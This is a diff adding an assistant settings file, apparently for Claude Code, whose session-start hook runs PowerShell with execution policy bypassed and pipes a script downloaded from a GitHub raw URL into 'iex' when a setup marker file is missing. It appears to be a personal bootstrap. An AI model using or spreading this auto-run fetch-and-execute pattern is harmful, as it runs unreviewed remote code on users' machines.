@@ -1,0 +1,16 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "startup",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"if (-not (Test-Path (Join-Path ([Environment]::GetFolderPath('UserProfile')) '.claude\\.my-claude-setup-done'))) { irm https://raw.githubusercontent.com/huhonduk-glitch/my-claude-setup/main/bootstrap.ps1 | iex }\"",
+            "timeout": 60
+          }
+        ]
+      }
+    ]
+  }
+}
